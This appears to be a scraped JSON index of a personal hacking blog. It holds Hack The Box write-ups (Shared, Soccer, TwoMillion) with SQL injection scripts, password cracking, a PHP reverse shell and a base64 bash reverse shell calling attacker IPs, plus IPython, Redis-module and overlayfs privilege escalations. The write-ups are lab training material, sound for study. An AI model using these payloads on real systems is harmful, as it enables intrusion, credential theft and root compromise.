$url -b \u0026#34;custom_cart=$true\u0026#34; | sed \u0026#39;s/^ *//\u0026#39; \u0026gt; true.html curl -k -s $url -b \u0026#34;custom_cart=$false\u0026#34; | sed \u0026#39;s/^ *//\u0026#39; \u0026gt; false.html This should leave you with two files called false.html{:.filepath} and true.html{:.filepath}. To find the difference between the two response bodies we can use diff.\ndiff false.html true.html 37,39c37,39 \u0026lt; \u0026lt;td\u0026gt;Not Found\u0026lt;/td\u0026gt; \u0026lt; \u0026lt;td\u0026gt;0\u0026lt;/td\u0026gt; \u0026lt; \u0026lt;td\u0026gt;$0,00\u0026lt;/td\u0026gt; --- \u0026gt; \u0026lt;td\u0026gt;53GG2EF8\u0026lt;/td\u0026gt; \u0026gt; \u0026lt;td\u0026gt;1\u0026lt;/td\u0026gt; \u0026gt; \u0026lt;td\u0026gt;$23,90\u0026lt;/td\u0026gt; 45c45 \u0026lt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;$0,00\u0026lt;/th\u0026gt; --- \u0026gt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;$23,90\u0026lt;/th\u0026gt; The false query returns “Not Found” and zero values for the quantity and price while the true query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.\nWeb Exploitation # We have already determined that boolean-based blind SQL injection is possible with the true and false queries, but there is a good chance we can use UNION SELECT queries to exfiltrate database values without having to use a side-channel.\nUnion Query Exfiltration # Let’s first find the number of columns in the original query so we can match it in our UNION SELECT extension.\npayload=$(./makepayload.py \u0026#34;\u0026#39; UNION SELECT \u0026#39;c0lumn1\u0026#39;,\u0026#39;c0lumn2\u0026#39;,\u0026#39;c0lumn3\u0026#39;#\u0026#34;) curl -k -s \u0026#34;https://checkout.shared.htb\u0026#34; -b \u0026#34;custom_cart=$payload\u0026#34; | \\ sed \u0026#39;s/^ *//\u0026#39; | egrep \u0026#39;\u0026lt;/?td\u0026gt;\u0026#39; \u0026lt;td\u0026gt;c0lumn2\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;1\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;$\u0026lt;/td\u0026gt; Notice how the response contains the value we sent in the second column. This means we can extract data through the second column. Now let’s create a script to get any raw value from the database.\n#!/bin/bash [ -z \u0026#34;$SELECT\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;SELECT=* FROM=* WHERE=* $0\u0026#34; \u0026amp;\u0026amp; exit payload=\u0026#34;\u0026#39; UNION SELECT \u0026#39;\u0026#39;,$SELECT,\u0026#39;\u0026#39;\u0026#34; [ -z \u0026#34;$FROM\u0026#34; ] || payload=\u0026#34;$payload FROM $FROM\u0026#34; [ -z \u0026#34;$WHERE\u0026#34; ] || payload=\u0026#34;$payload WHERE $WHERE\u0026#34; echo $payload payload=$(./makepayload.py \u0026#34;$payload#\u0026#34;) curl -k -s \u0026#34;https://checkout.shared.htb\u0026#34; -b \u0026#34;custom_cart=$payload\u0026#34; | egrep \u0026#39;\u0026lt;/?td\u0026gt;\u0026#39; | head -1 | sed -E \u0026#39;s/^ *\u0026lt;td\u0026gt;(.*)\u0026lt;\\/td\u0026gt;$/\\1/\u0026#39; Then we can see if we can get the available database names. Remember that this database is probably MySQL because the # comment is working.\nchmod +x sqli.sh SELECT=\u0026#34;group_concat(schema_name)\u0026#34; \\ FROM=\u0026#34;information_schema.schemata\u0026#34; \\ ./sqli.sh information_schema,checkout There is a database called checkout that we should explore. Let’s find the names of its tables.\nSELECT=\u0026#34;group_concat(table_name)\u0026#34; \\ FROM=\u0026#34;information_schema.tables\u0026#34; \\ WHERE=\u0026#34;table_schema=\u0026#39;checkout\u0026#39;\u0026#34; \\ ./sqli.sh user,product The user table seems interesting. Let’s find the column names and dump the table contents.\nSELECT=\u0026#34;group_concat(column_name)\u0026#34; \\ FROM=\u0026#34;information_schema.columns\u0026#34; \\ WHERE=\u0026#34;table_name=\u0026#39;user\u0026#39;\u0026#34; \\ ./sqli.sh id,username,password SELECT=\u0026#34;group_concat(concat(id,0x7c,username,0x7c,password))\u0026#34; \\ FROM=\u0026#34;checkout.user\u0026#34; \\ ./sqli.sh 1|james_mason|[REDACTED] There is only one result, but we got what looks like an MD5 hash in the password column for the user james_mason.\nShell as james_mason # Let’s try to crack the hash using John the Ripper\n# mhil4ne@kali hash=\u0026#34;\u0026#34; # Hash here echo \u0026#34;james_mason:$hash\u0026#34; \u0026gt; md5.john john md5.john \\ --format=\u0026#34;raw-md5\u0026#34; \\ --wordlist=\u0026#34;rockyou.txt\u0026#34; # classic rockyou.txt wordlist Using these credentials on the target’s SSH server will land us a shell as james_mason.\n# mhil4ne@kali ssh \u0026#34;james_mason@$rhost\u0026#34; There is no user flag in our home directory so we might need to do some lateral movement.\nLateral Movement # We will be using LinPEAS from PEASS-ng to look for any useful information on the machine. We will also be using pspy to snoop on processes.\n# mhil4ne@kali lhost=\u0026#34;10.10.14.10\u0026#34; # Listener host cd $(mktemp -d) wget \\ \u0026#34;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\u0026#34; \\ \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh\u0026#34; php -S $lhost:80 # james_mason@shared.htb (SSH) lhost=\u0026#34;10.10.14.10\u0026#34; # Attacker\u0026#39;s IP address mkdir .sneak \u0026amp;\u0026amp; cd .sneak wget \u0026#34;http://$lhost/pspy64\u0026#34; \u0026#34;http://$lhost/linpeas.sh\u0026#34; bash ./linpeas.sh | tee linpeas.log We don’t get anything that blatantly stands out in the LinPEAS output. Let’s try running PSpy for a few minutes.\n# james_mason@shared.htb (SSH) chmod +x pspy64 timeout 3m ./pspy64 | tee pspy.log Looking at the output, user ID 0 and user ID 1001 seem to be running routine commands. UID 0 is root and User ID 1001 turns out to be user dan_smith, declared in /etc/passwd{:.filepath}. It can be noted that dan_smith runs an interesting command every minute.\n/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ \u0026amp;\u0026amp; /usr/local/bin/ipython The user enters the /opt/scripts_review{:.filepath} directory and executes /usr/local/bin/ipython{:.filepath}.\nCVE-2022-21699 # After doing some research into ipython, we come across a vulnerability advisory that details a code execution flaw.\nWe’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.\nLet’s check if the version on the machine is vulnerable.\n# james_mason@shared.htb (SSH) /usr/local/bin/ipython --version The version is 8.0.0, which is vulnerable. Since the routine command executed by dan_smith is run in the /opt/scripts_review{:.filepath} directory, we could exploit the vulnerability if /opt/scripts_review{:.filepath} is writable.\n# james_mason@shared.htb (SSH) ls -la /opt/scripts_review It is writable by those in the developer group. According to the output of the id command, our current user is actually part of this group.\nExploitation # Let’s test our hypothesis by following the instructions in the advisory to execute code as dan_smith.\n#!/bin/bash exploitdir=\u0026#34;/opt/scripts_review\u0026#34; cmd=\u0026#34;cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh\u0026#34; mkdir -m 777 \u0026#34;$exploitdir/profile_default\u0026#34; mkdir -m 777 \u0026#34;$exploitdir/profile_default/startup\u0026#34; echo \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;$cmd\u0026#39;)\u0026#34; \u0026gt; \u0026#34;$exploitdir/profile_default/startup/x.py\u0026#34; After running the script and waiting a minute, our SUID shell should be at /tmp/dan_smith_sh{:.filepath}.\n# james_mason@shared.htb (SSH) /tmp/dan_smith_sh -p Privilege Escalation # The first flag is located at /home/dan_smith/user.txt{:.filepath}\nStabilizing Shell # Let’s copy the contents of /home/dan_smith/.ssh/id_rsa{:.filepath} over to the attacker machine and use it to log in as dan_smith via SSH to get a more stable shell.\n# mhil4ne@kali chmod 600 dan_smith_id_rsa ssh -i dan_smith_id_rsa \u0026#34;dan_smith@$rhost\u0026#34; When running the id command, we learn that our current user is part of the sysadmin group. Let’s see what this group has special access to.\n# dan_smith@shared.htb (SSH) find / -group sysadmin 2\u0026gt;/dev/null /usr/local/bin/redis_connector_dev One file at /usr/local/bin/redis_connector_dev{:.filepath} is returned. This file probably has something to do with a key-value data storage solution known as Redis. When we execute /usr/local/bin/redis_connector_dev{:.filepath}, it prints a log message saying “Logging to redis instance using password” and what looks like the output of the INFO Server redis query.\nRedis # Let’s gather some basic info on the file and see what’s going on behind the scenes.\n# dan_smith@shared.htb (SSH) file /usr/local/bin/redis_connector_dev|tr \u0026#39;,\u0026#39; \u0026#39;\\n\u0026#39; Based on the output of the file command, we can note a few things about the file:\nIt is an ELF x86-64 executable it was built with a Go compiler (hence the Go BuildID) It is not stripped Since the Redis RESP protocol operates in plaintext, we might be able to capture the password. First, let’s copy the file to the attacker machine.\n# mhil4ne@kali scp -i dan_smith_id_rsa \u0026#34;dan_smith@$rhost:/usr/local/bin/redis_connector_dev\u0026#34; . chmod +x redis_connector_dev Running the file on the attacker machine, we get an error complaining that TCP port 6379 is closed on the loopback address. We can open that port by running nc in a separate tab.\n# mhil4ne@kali nc -lv 127.0.0.1 6379 Now if we run ./redis_connector_dev{:.filepath} we get some output to the listener.\nConnection received on localhost 35468 *2 $4 auth $16 [REDACTED] The strings auth and [REDACTED] are passed. Given the circumstances, the second string seems like it may be the password so let’s try using that with the redis-cli command back on the target machine.\n# dan_smith@shared.htb (SSH) redis-cli -a \u0026#34;$password\u0026#34; INFO server The INFO server command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.\n# dan_smith@shared.htb (SSH) redis-cli -a \u0026#34;$password\u0026#34; INFO keyspace After some research on redis, we come across this page which presents different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is root meaning we will execute commands as root if RCE is possible.\nOne method is to load a special shared object file using MODULE LOAD query. We can build the shared object from this source code on the attacker machine, then copy module.so{:.filepath} to the target.\n# james_mason@shared.htb (SSH) command=\u0026#34;cp /bin/sh /root_sh;chmod a+xs /root_sh\u0026#34; redis-cli -a \u0026#34;$password\u0026#34; MODULE LOAD ~/module.so \u0026amp;\u0026amp; redis-cli -a \u0026#34;$password\u0026#34; system.exec \u0026#34;$command\u0026#34; /root_sh -p Running this should land us a shell as root where the last flag can be found at /root/root.txt{:.filepath}\n","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/8.-shared/","section":"Hackthebox Writeups","summary":"Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection.","title":"Shared Writeup","type":"writeups"},{"content":" Initial Recon # We check the connection with the victim machine:\n❯ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Let’s run our scan with nmap:\n❯ nmap 10.10.11.194 Nmap scan report for 10.10.11.194 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9091/tcp open xmltec-xmlmail We have 3 open ports on the machine, in which we can find 3 services.\nThe first thing we are going to do is check port 80.\nBy looking at the “Location” header when we make a curl request, we can see the domain.\n❯ curl -s 10.10.11.194 -I | grep Location Location: http://soccer.htb/ We add the address of this website to our /etc/hosts file.\n❯ echo \u0026#34;10.10.11.194 soccer.htb\u0026#34; | sudo tee -a /etc/hosts Web # Now we can access the website.\nWe use gobuster to list directories.\n❯ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 =============================================================== [+] Url: http://soccer.htb [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt =============================================================== Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u0026gt; http://soccer.htb/tiny/] found a subdomain: http://soccer.htb/tiny/\nWe find a file manager with a login.\nSearch default credentials on the internet:\nUsername: admin Password: admin@123 With this we get access to the file manager. We can see the web files and the “tiny” directory.\nWe can also see that we can upload files in this button that appears at the top of the page.\nYou can see that the page is made in PHP, so we are going to try to send a ReverseShell in PHP code.\nshell.php # Create a file you can call “shell.php” in which you write the command to be executed on the victim machine.\n\u0026lt;?php system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;) ?\u0026gt; Here I share a reverse shell generator, Rev Shell\nAfter creating our file, we upload it to the file manager.\nNetcat # We listen on port 443.\n❯ sudo netcat -lvnp 443 [sudo] password for mhil4ne: listening on [any] 443 ... We call our shell.php:\n❯ curl soccer.htb/tiny/uploads/shell.php I already have a shell like www-data\nPython Exploit # Let’s do a SQL injection.\nI found an exploit written in Python for this, we modified a few lines of code to adapt it to the victim machine:\nfrom http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \u0026#34;ws://soccer.htb:9091/\u0026#34; def send_ws(payload): ws = create_connection(ws_server) message = unquote(payload).replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;) data = \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;%s\u0026#34;}\u0026#39; % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return \u0026#39;\u0026#39; def middleware_server(host_port,content_type=\u0026#34;text/plain\u0026#34;): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -\u0026gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split(\u0026#39;=\u0026#39;,1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = \u0026#39;No parameters specified!\u0026#39; self.send_header(\u0026#34;Content-type\u0026#34;, content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\u0026#34;[+] Starting MiddleWare Server\u0026#34;) print(\u0026#34;[+] Sending payloads\u0026#34;) try: middleware_server((\u0026#39;0.0.0.0\u0026#39;,8081)) except KeyboardInterrupt: pass What this exploit does is redirect requests, let’s run it:\n❯ python3 exploit.py [+] Starting MiddleWare Server [+] Sending payloads Sqlmap # Now, with sqlmap, as we had configured in the Python exploit, we point to our localhost and try to list the databases.\n❯ sqlmap -u \u0026#34;http://127.0.0.1:8081/?id=1\u0026#34; --batch -dbs Database: soccer_db [1 table] +----------+ | accounts | +----------+ We have the “accounts” table:\n❯ sqlmap -u \u0026#34;http://127.0.0.1:8081/?id=1\u0026#34; --batch -D soccer_db -T accounts -columns Database: soccer_db Table: accounts [4 columns] +----------+-------------+ | Column | Type | +----------+-------------+ | email | varchar(40) | | id | int | | password | varchar(40) | | username | varchar(40) | +----------+-------------+ We are interested in the “username” and “password” columns.\n❯ sqlmap -u \u0026#34;http://127.0.0.1:8081/?id=1\u0026#34; --batch -D soccer_db -T accounts -C username,password -dump Database: soccer_db Table: accounts [1 entry] +----------+----------------------+ | username | password | +----------+----------------------+ | player | PlayerOfthe********* | +----------+----------------------+ SSH Connection # ❯ ssh player@10.10.11.194 player@10.10.11.194\u0026#39;s password: Privilege Escalation # Now we would only have to raise the privileges.\nWe list the content of the following path:\nplayer@soccer:~$ ls -la /usr/local/share/dstat total 8 drwxrwx--- 2 root player 4096 Mar 14 16:21 . drwxr-xr-x 6 root root 4096 Nov 17 09:16 .. We can see that we have write capacity in the “share/dstat” path, where the Plugins are stored.\nWhat we are going to do is create a Python file, and then run it as if it were a Plugin, since we have permissions on this path.\necho \u0026#39;import os;os.system(\u0026#34;chmod u+s /bin/bash\u0026#34;)\u0026#39; \u0026gt; dstat_privesc.py doas -u root /usr/bin/dstat --privesc \u0026amp;\u0026gt;/dev/null bash -p Here we have the Root\nbash-5.0# ls /root/root.txt /root/root.txt bash-5.0# ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/9.-soccer/","section":"Hackthebox Writeups","summary":"Initial Recon # We check the connection with the victim machine:","title":"Soccer Writeup","type":"writeups"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Initial Recon # First a ping to the victim machine:\n\u0026gt; ping -c 1 10.10.11.221 PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data. 64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=2162 ms --- 10.10.11.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 2162.481/2162.481/2162.481/0.000 ms Start your scan with nmap:\n\u0026gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.221 -oG scan Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:44 AST Nmap scan report for 10.10.11.221 Host is up (0.089s latency). Not shown: 61140 closed tcp ports (reset), 4393 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 44.46 seconds \u0026gt; nmap -p22,80 -sVC 10.10.11.221 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:48 AST Nmap scan report for 10.10.11.221 (10.10.11.221) Host is up (0.076s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA) |_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds Web # We add the domain to our /etc/hosts, we see the web page (Port 80).\nFeroxbuster # We are going to apply fuzzing to see possible directories on the web:\nWhen investigating each of our results we have 2 interesting directories /register and /js/inviteapi.min.js\nGenerate a Invite Code # Apparently we need an invitation code to access.\nWe look at the other path and see that it is a javascript script:\nfind a function that creates an invite code for us\nWe see that it makes a POST request to an api in /api/v1/invite/how/to/generate.\nI am trying to make a request to the API. (/api/v1) but it tells me that it does not exist so I try to generate a code.\n\u0026gt; curl -sXPOST http://2million.htb/api/v1/invite/how/to/generate {\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;data\u0026#34;:\u0026#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\u0026#34;,\u0026#34;enctype\u0026#34;:\u0026#34;ROT13\u0026#34;},\u0026#34;hint\u0026#34;:\u0026#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\u0026#34;} Returns a string in ROT13\n\u0026gt; echo \u0026#39;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\u0026#39; | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39; In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate We create our invitation code.\n\u0026gt; curl -sXPOST http://2million.htb/api/v1/invite/generate {\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;code\u0026#34;:\u0026#34;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;encoded\u0026#34;}} \u0026gt; echo \u0026#34;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=\u0026#34; | base64 -d TM2FX-2Y19S-GBOC1-579MK Now, with the cookie provided to us upon login, we can access more API End Points.\nSee more information with session cookie # Now, with the cookie provided to us upon login, we can access more API End Points.\n\u0026gt; curl -s http://2million.htb/api/v1 -b \u0026#39;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh\u0026#39; | jq { \u0026#34;v1\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;GET\u0026#34;: { \u0026#34;/api/v1\u0026#34;: \u0026#34;Route List\u0026#34;, \u0026#34;/api/v1/invite/how/to/generate\u0026#34;: \u0026#34;Instructions on invite code generation\u0026#34;, \u0026#34;/api/v1/invite/generate\u0026#34;: \u0026#34;Generate invite code\u0026#34;, \u0026#34;/api/v1/invite/verify\u0026#34;: \u0026#34;Verify invite code\u0026#34;, \u0026#34;/api/v1/user/auth\u0026#34;: \u0026#34;Check if user is authenticated\u0026#34;, \u0026#34;/api/v1/user/vpn/generate\u0026#34;: \u0026#34;Generate a new VPN configuration\u0026#34;, \u0026#34;/api/v1/user/vpn/regenerate\u0026#34;: \u0026#34;Regenerate VPN configuration\u0026#34;, \u0026#34;/api/v1/user/vpn/download\u0026#34;: \u0026#34;Download OVPN file\u0026#34; }, \u0026#34;POST\u0026#34;: { \u0026#34;/api/v1/user/register\u0026#34;: \u0026#34;Register a new user\u0026#34;, \u0026#34;/api/v1/user/login\u0026#34;: \u0026#34;Login with existing user\u0026#34; } }, \u0026#34;admin\u0026#34;: { \u0026#34;GET\u0026#34;: { \u0026#34;/api/v1/admin/auth\u0026#34;: \u0026#34;Check if user is admin\u0026#34; }, \u0026#34;POST\u0026#34;: { \u0026#34;/api/v1/admin/vpn/generate\u0026#34;: \u0026#34;Generate VPN for specific user\u0026#34; }, \u0026#34;PUT\u0026#34;: { \u0026#34;/api/v1/admin/settings/update\u0026#34;: \u0026#34;Update user settings\u0026#34; } } } } Change my user settings # We change our user settings:\ncurl -sXPUT http://2million.htb/api/v1/admin/settings/update -b \u0026#39;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;: \u0026#34;mhil4ne@gmail.com\u0026#34;, \u0026#34;is_admin\u0026#34;: 1}\u0026#39; Now that we are admin user, we can inject commands through the username parameter.\nRevShell (www-data) # We prepare our revShell and pass it in Base64:\ncurl -sXPOST http://2million.htb/api/v1/admin/vpn/generate -b \u0026#39;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;mhil4ne;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1MC80NDMgMD4mMQo=| base64 -d | bash\u0026#34;}\u0026#39; nc -nlvp 443 find .env:\nLook at the file /etc/passwd:\nadmin1000:1000::/home/admin:/bin/bash admin user credentials # Try the password with this user:\nadmin : SuperDuperPass123 Privilege Escalation # CVE-2023-0386 # We take it to our attacking machine:\nsvn checkout https://github.com/DataDog/security-labs-pocs/trunk/proof-of-concept-exploits/overlayfs-cve-2023-0386 We compile the file:\nInstall libfuse-dev\ngcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -lpthread You pass the file to the victim machine:\n# From the victim machine nc -nlvp 1222 \u0026gt; poc # From the attacking machine nc 10.10.11.221 1234 \u0026lt; poc Now we give it execution permissions:\nchmod +x poc We execute it\n./poc You are now Root.\nroot@2million:~# whoami root ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/10.-twomillion/","section":"Hackthebox Writeups","summary":"Initial Recon # First a ping to the victim machine:","title":"TwoMillion Writeup","type":"writeups"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/11.-wifinetic/","section":"Hackthebox Writeups","summary":"Learn more about me and why I am starting this blog.","title":"Wifinetic Writeup","type":"writeups"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/malwdev/","section":"Mil4ne's Blog","summary":"","title":"","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/posts/","section":"","summary":"","title":"","type":"posts"},{"content":" Bswpm Auto INstall Script in c++ to install work environment in kali linux\nView ","date":"1 January 0001","externalUrl":null,"permalink":"/toolsdev/","section":"Mil4ne's Blog","summary":"Bswpm Auto INstall Script in c++ to install work environment in kali linux","title":"","type":"page"},{"content":" Jose Milane (Aka. Mil4ne) # Hello! I’m Jose Milane, a passionate cybersecurity enthusiast aged 20. My aim is to share the knowledge I acquire.\nGitHub LinkedIn HackTheBox\nAbout the Blog # We are dedicated to promoting knowledge and practice of ethical hacking. Our mission is to provide accessible and educational resources for those interested in learning how to protect systems and data in an ethical and responsible manner.\nOur Vision # We strive to create an online community where cybersecurity enthusiasts can explore, learn, and practice ethical hacking skills. We believe in an educational approach that fosters integrity, ethics, and responsibility in the digital world.\nWhat We Offer # You will find a variety of resources, from hands-on tutorials to informative articles and ethical hacking challenges. Our goal is to empower individuals of all skill levels to contribute to online security in a positive way.\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Mil4ne's Blog","summary":"Jose Milane (Aka.","title":"About","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":" CVE-2023-23752 - Joomla-v4.2.8 Script in c++ for exploit Joomla Vulnerability\nView CVE-2024-23897 - Jenkins-4.441 Script in c++ for exploit Jenkins Vulnerability\nView ","date":"1 January 0001","externalUrl":null,"permalink":"/exploitdev/","section":"Mil4ne's Blog","summary":"CVE-2023-23752 - Joomla-v4.","title":"Exploit Dev","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":" My Personal Blog Blog Programming and Cybersecurity\nView Felmar Realty Web Website development for a real state company\nView Imperio Felmar Group Web Website development for a IFG company\nView ","date":"1 January 0001","externalUrl":null,"permalink":"/webdev/","section":"Mil4ne's Blog","summary":"My Personal Blog Blog Programming and Cybersecurity","title":"Web Dev","type":"page"}]